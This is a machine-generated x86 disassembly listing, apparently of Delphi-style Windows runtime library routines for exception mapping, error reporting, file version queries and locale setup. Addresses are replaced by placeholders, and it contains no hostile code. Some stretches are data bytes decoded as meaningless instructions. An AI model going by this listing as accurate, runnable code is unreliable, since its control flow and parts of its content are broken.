mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bc70
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405d64
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_409070
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc77
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
add esp 0xfffffff0
call sub_403550
sub_40bc77
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_40bc98
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403fd0
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_40bd0c
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402948
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bd6e
inc eax
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_4039b8
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bb0c
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40bd0c
mov edx eax
sub_40bde0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40be7c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404014
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be83
lea eax [ ebp - 0x20 ]
call sub_403f7c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40bed0
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bf68
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c123
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4041ec
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408838
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c12a
lea eax [ ebp - 0x170 ]
call sub_403f7c
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403fa0
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40c134
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c1ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bed0
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bb0c
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
push ebp
call sub_40bf68
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c1f6
lea eax [ ebp - 0x10 ]
call sub_403f7c
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
mov ebx eax
sub_40c210
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c200
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bf50
mov eax [ rw-data ]
mov [ eax ] sub_40c134
mov eax sub_40be9c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40beb8
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c294
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_4031ec
xor eax eax
mov [ rw-data ] eax
sub_40c314
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4041ec
sub_40c3a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c47a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404014
lea eax [ ebp - 0x8 ]
call j_sub_404448#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40443c
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c481
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
mov eax ebx
call sub_40276c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c45d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40443c
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40278c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c490
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c508
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_40443c
mov edx esi
dec edx
call sub_40c490
sub_40c544
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40423c
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c56c
pop esi
pop ebx
retn
mov eax ebx
call sub_40423c
mov esi eax
sub_40c56c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40423c
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c77c
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c5c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_40423c
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c77c
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c77c
dec eax
mov ebx eax
sub_40c654
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40423c
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c5c4
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_40423c
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c6b8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40423c
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_40423c
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c5c4
mov eax esi
call sub_40423c
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_40423c
mov [ esp ] eax
jmp r-xdata
sub_40c740
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_40443c
add eax esi
dec eax
call sub_40c718
sub_40c77c
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_40443c
add eax ebx
dec eax
call sub_40c718
add eax ebx
sub_40c7b8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_40423c
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c508
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c7ec
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40423c
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40c508
test al al
jne r-xdata
mov eax ebp
call sub_40443c
mov dl [ esi + edi - 0x1 ]
call sub_408b18
test eax eax
setne bl
sub_40c830
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_40443c
push eax
mov eax esi
call sub_40443c
mov ebp eax
mov eax ebp
pop edx
call sub_40c8f4
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c868
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407fe0
mov eax esi
call sub_40423c
mov ebp eax
mov eax edi
mov edx ebp
call sub_4045c8
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404448
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404448
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404448
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c8f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408968
mov [ esp ] eax
mov eax ebp
call sub_408968
mov edi eax
mov edx ebp
mov eax esi
call sub_408b2c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c52c
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408b2c
mov ebx eax
inc ebx
sub_40c994
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c9bc
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c9bc
test eax eax
jne r-xdata
sub_40c9bc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408b18
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c52c
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408b18
mov edi eax
test edi edi
jne r-xdata
sub_40c9fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40ca60
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4041ec
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408334
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ca67
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_40ca70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c9fc
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40cae8
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40cad0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40ca70
pop ecx
push ebp
call sub_40ca70
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402d1c
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cc5c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40cf27
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40cae8
call sub_40b3f4
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b344
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fd0
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b344
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408334
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b344
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408334
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b390
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b390
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b344
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408334
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b390
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b344
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b67c
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403fd0
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b344
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b67c
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403fd0
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b390
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b344
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403fd0
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b344
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403fd0
lea eax [ ebp - 0x8 ]
call sub_403f7c
lea eax [ ebp - 0xc ]
call sub_403f7c
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b344
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408334
test eax eax
jne r-xdata
call sub_40b5cc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404014
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404014
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042fc
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042fc
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b390
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cf2e
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403fa0
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b344
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408334
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b344
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408334
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404014
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404014
jmp r-xdata
sub_40cfdc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40d06c
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b2f8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d073
